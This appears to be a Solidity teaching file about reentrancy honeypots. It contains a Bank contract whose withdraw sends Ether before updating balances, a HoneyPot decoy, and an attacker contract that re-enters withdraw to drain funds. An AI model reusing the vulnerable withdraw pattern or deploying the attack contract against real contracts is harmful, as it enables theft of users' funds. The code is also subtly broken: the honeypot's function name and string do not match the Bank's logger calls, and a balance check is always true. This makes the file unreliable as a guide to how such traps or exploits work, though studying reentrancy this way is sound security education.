// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

contract Bank {
    Logger logger;
    mapping(address => uint) public balancies;

    constructor(address _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balancies[msg.sender] += msg.value;
        logger.emitLog(msg.sender, msg.value, "Deposit");
    }

    function withdraw() public {
        uint bal = balancies[msg.sender];
        require(bal >= 0, "Not enought resources");

        (bool result, ) = msg.sender.call{value: bal}("");
        require(result, "failed to send Ether");

        balancies[msg.sender] -= bal;
        logger.emitLog(msg.sender, bal, "WITHDRAW");
    }
}

contract Logger {
    event Log(address collerAddress, uint amount, string message);

    function emitLog(
        address _caller,
        uint _amount,
        string memory _message
    ) public {
        emit Log(_caller, _amount, _message);
    }
}

contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public pure {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(
        string memory _a,
        string memory _b
    ) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

contract StupidAttack {
    Bank bank;
    uint constant AMOUNT = 1 ether;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= AMOUNT);
        bank.deposit{value: AMOUNT}();
        bank.withdraw();
    }

    function withdrawAll() public {
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(sent);
    }
}
